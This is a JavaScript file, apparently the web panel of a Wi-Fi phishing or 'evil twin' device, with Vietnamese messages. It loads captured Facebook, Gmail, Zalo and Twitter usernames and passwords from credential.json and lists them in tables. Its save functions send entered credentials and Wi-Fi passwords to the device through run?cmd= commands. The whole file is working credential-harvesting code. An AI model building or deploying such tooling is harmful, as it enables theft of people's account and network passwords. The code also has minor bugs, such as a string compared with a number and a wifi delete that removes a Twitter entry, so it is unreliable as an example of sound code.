var credentialJson = {};
loadLang();
function load() {
  getFile("credential.json", function (res) {
    credentialJson = JSON.parse(res);
    draw();
  });

  getFile("attack.json", function (response) {
    attackJSON = JSON.parse(response);
    draw();
  });

  getFile("wifissid.json", function (res) {
    document.getElementById("ssid").innerHTML = res;
  });
}

function draw() {
  var htmlFb = "";
  htmlFb =
    "<tr>" +
    "<th class='id'>ID</th>" +
    "<th class='username'>USERNAME</th>" +
    "<th class='password'>PASSWORD</th>" +
    "</tr>";

  var htmlGmail = "";
  htmlGmail =
    "<tr>" +
    "<th class='id'>ID</th>" +
    "<th class='name'>USERNAME</th>" +
    "<th class='gmailpassword'>PASSWORD</th>" +
    "</tr>";

  var zalohtml = "";
  zalohtml =
    "<tr>" +
    "<th class='id'>ID</th>" +
    "<th class='username'>USERNAME</th>" +
    "<th class='password'>PASSWORD</th>" +
    "</tr>";

  var twitterhtml = "";
  twitterhtml =
    "<tr>" +
    "<th class='id'>ID</th>" +
    "<th class='username'>USERNAME</th>" +
    "<th class='password'>PASSWORD</th>" +
    "</tr>";
  for (var key in credentialJson) {
    if (credentialJson.hasOwnProperty(key)) {
      if (key === "facebook") {
        var facebook = credentialJson[key];
        for (var i in facebook)
          htmlFb +=
            "<tr>" +
            "<td class='id'>" +
            i +
            "</td>" +
            "<td class='name'>" +
            facebook[i][0] +
            "</td>" +
            "<td class='phone'>" +
            facebook[i][1] +
            "</td>" +
            "<td class='remove'><button class='red' onclick='remove(1," +
            i +
            ")'>X</button></td>" +
            "</tr>";
      } else if (key == "gmail") {
        var gmail = credentialJson[key];
        for (var i in gmail)
          htmlGmail +=
            "<tr>" +
            "<td class='id'>" +
            i +
            "</td>" +
            "<td class='name'>" +
            gmail[i][0] +
            "</td>" +
            "<td class='gmail'>" +
            gmail[i][1] +
            "</td>" +
            "<td class='remove'><button class='red' onclick='remove(0," +
            i +
            ")'>X</button></td>" +
            "</tr>";
      } else if (key == "twitter") {
        var twitter = credentialJson[key];
        for (var i in twitter)
          twitterhtml +=
            "<tr>" +
            "<td class='id'>" +
            i +
            "</td>" +
            "<td class='name'>" +
            twitter[i][0] +
            "</td>" +
            "<td class='phone'>" +
            twitter[i][1] +
            "</td>" +
            "<td class='remove'><button class='red' onclick='remove(4," +
            i +
            ")'>X</button></td>" +
            "</tr>";
      } else {
        var zalo = credentialJson[key];
        for (var i in zalo)
          zalohtml +=
            "<tr>" +
            "<td class='id'>" +
            i +
            "</td>" +
            "<td class='name'>" +
            zalo[i][0] +
            "</td>" +
            "<td class='phone'>" +
            zalo[i][1] +
            "</td>" +
            "<td class='remove'><button class='red' onclick='remove(3," +
            i +
            ")'>X</button></td>" +
            "</tr>";
      }
    }
  }

  document.getElementById("fbTable").innerHTML = htmlFb;
  document.getElementById("gmailTable").innerHTML = htmlGmail;
  document.getElementById("zaloTable").innerHTML = zalohtml;
  document.getElementById("twitterTable").innerHTML = twitterhtml;
}

function saveFacebook() {
  var usename = getE("username").value;
  var password = getE("password").value;
  const isPhone =
    /^(0|\+84)(\s|\.)?((3[2-9])|(5[689])|(7[06-9])|(8[1-689])|(9[0-46-9]))(\d)(\s|\.)?(\d{3})(\s|\.)?(\d{3})$/;
  var reg = new RegExp("([A-Za-z0-9._%+-]+@[a-z0-9.-]+.[a-z]{2,3})$");
  
  if (usename == "" || password == "") {
    alert("Vui lòng nhập đầy đủ thông tin");
    return;
  }
  
  if (isPhone.test(usename) || reg.test(usename)) {
    getFile("run?cmd=savefb" + ' "' + usename + '"' + ' "' + password + '"');
    alert(lang("system_busy"));
  } else {
    alert(lang("facebook_invalid"));
  }
}

function saveTwitter() {
  var usename = getE("twitter_user").value;
  var password = getE("twitter_pass").value;
  const isPhone =
    /^(0|\+84)(\s|\.)?((3[2-9])|(5[689])|(7[06-9])|(8[1-689])|(9[0-46-9]))(\d)(\s|\.)?(\d{3})(\s|\.)?(\d{3})$/;
  var reg = new RegExp("([A-Za-z0-9._%+-]+@[a-z0-9.-]+.[a-z]{2,3})$");
  if (usename == "" || password == "") {
    alert("Vui lòng nhập đầy đủ thông tin");
    return;
  }
  if (isPhone.test(usename) || reg.test(usename)) {
    getFile(
      "run?cmd=savetwitter" + ' "' + usename + '"' + ' "' + password + '"'
    );
    alert(lang("system_busy"));
  } else {
    alert(lang("twitter_invalid"));
  }
}

function saveZalo() {
  var usename = getE("zlusername").value;
  var password = getE("zlpassword").value;
  const isPhone =
    /^(0|\+84)(\s|\.)?((3[2-9])|(5[689])|(7[06-9])|(8[1-689])|(9[0-46-9]))(\d)(\s|\.)?(\d{3})(\s|\.)?(\d{3})$/;
  var reg = new RegExp("([A-Za-z0-9._%+-]+@[a-z0-9.-]+.[a-z]{2,3})$");
  if (usename == "" || password == "") {
    alert("Vui lòng nhập đầy đủ thông tin");
    return;
  }
  if (isPhone.test(usename) || reg.test(usename)) {
    getFile("run?cmd=savezalo" + ' "' + usename + '"' + ' "' + password + '"');
    alert(lang("system_busy"));
  } else {
    alert(lang("phone_invalid"));
  }
}

function saveGmail() {
  var gmailname = getE("gmailname").value;
  var gmailpassword = getE("gmailpassword").value;
  var gmailReg = /^[a-zA-Z0-9._-]+@[a-zA-Z0-9._-]+\.[a-zA-Z]{2,4}$/;
  var gm_password = /^.{8,}$/;
  if (gmailname == "" || gmailpassword == "") {
    alert("Vui lòng nhập đầy đủ thông tin");
    return;
  }
  if (gmailReg.test(gmailname)) {
    if (gm_password.test(gmailpassword)) {
      getFile(
        "run?cmd=saveGmail" + ' "' + gmailname + '"' + ' "' + gmailpassword + '"'
      );
      alert(lang("system_busy"));
    } else {
      alert("Mật khẩu không đúng");
    }
  } else {
    alert("Địa chỉ gmail không hợp lệ");
  }
}

function saveWifi() {
  var name = document.getElementById("ssid").innerHTML;
  var pass = getE("passwifi").value;
  if (pass < 8) {
    alert(lang("password_error"));
  } else {
    getFile("run?cmd=savewifi" + ' "' + name + '"' + ' "' + pass + '"');
    alert(lang("system_busy"));
  }
}

function remove(type, id) {
  switch (type) {
    case 0:
      credentialJson.gmail.splice(id, 1);
      draw();
      getFile("run?cmd=credentialdelete gmail " + id);
      break;
    case 1:
      credentialJson.facebook.splice(id, 1);
      draw();
      getFile("run?cmd=credentialdelete facebook " + id);
      break;
    case 2:
      draw();
      getFile("run?cmd=credentialdelete all");
      break;
    case 3:
      credentialJson.zalo.splice(id, 1);
      draw();
      getFile("run?cmd=credentialdelete zalo " + id);
      break;
    case 4:
      credentialJson.twitter.splice(id, 1);
      draw();
      getFile("run?cmd=credentialdelete twitter " + id);
      break;
    case 5:
      credentialJson.twitter.splice(id, 1);
      draw();
      getFile("run?cmd=credentialdelete wifi " + id);
      break;
  }
}
